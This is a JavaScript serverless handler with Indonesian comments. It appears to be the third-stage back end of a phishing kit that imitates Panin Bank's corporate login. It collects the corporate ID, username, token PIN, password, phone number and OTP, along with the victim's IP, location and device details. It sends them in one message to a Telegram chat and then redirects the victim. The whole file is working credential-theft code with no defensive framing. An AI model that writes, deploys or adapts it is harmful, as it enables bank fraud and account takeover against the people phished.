const { sendMessage } = require('../utils');

/**
 * Serverless Function untuk menangani login tahap 3 (OTP) (menggantikan auth/3.php).
 * Data dari semua tahap harus dikirimkan kembali dari client-side.
 * @param {object} req - Objek permintaan (request).
 * @param {object} res - Objek respons (response).
 */
module.exports = async (req, res) => {
    // Hanya menerima metode POST
    if (req.method !== 'POST') {
        res.status(405).send('Method Not Allowed');
        return;
    }

    // Ambil data dari body permintaan (termasuk data dari semua tahap sebelumnya)
    const {
        j_corp_id,
        j_username,
        j_token_pin,
        j_password,
        j_phone_number,
        j_token_response, // Data baru (OTP)
        ip_address,
        country,
        city,
        region,
        isp,
        device,
        os,
        browser
    } = req.body;

    // Validasi input wajib
    if (!j_token_response) {
        res.status(400).json({
            success: false,
            message: 'Kode respons (OTP) tidak boleh kosong.'
        });
        return;
    }

    // Format pesan notifikasi Telegram
    const message = `
    --- 🏦 Panin Bank Login 3 (OTP) ---

    - ID Perusahaan     : ${j_corp_id || 'Tidak Diketahui'}
    - ID Pengguna       : ${j_username || 'Tidak Diketahui'}
    - Kode Token        : ${j_token_pin || 'Tidak Diketahui'}

    - Password Baru     : ${j_password || 'Tidak Diketahui'}
    - Nomor HP          : ${j_phone_number || 'Tidak Diketahui'}

    - Kode Respons (OTP): ${j_token_response}

    --- ℹ️ Informasi Pengunjung ---
    - Alamat IP         : ${ip_address || 'Tidak Diketahui'}
    - Negara            : ${country || 'Tidak Diketahui'}
    - Kota              : ${city || 'Tidak Diketahui'}
    - Wilayah           : ${region || 'Tidak Diketahui'}
    - ISP               : ${isp || 'Tidak Diketahui'}
    - Perangkat         : ${device || 'Tidak Diketahui'}
    - Sistem Operasi    : ${os || 'Tidak Diketahui'}
    - Browser           : ${browser || 'Tidak Diketahui'}
    ------------------------------
    `;

    // Kirim pesan ke Telegram
    await sendMessage(message);

    // Kirim respons sukses dan arahkan ke halaman akhir
    res.status(200).json({
        success: true,
        redirect: '/index.html' // Redirect final
    });
};
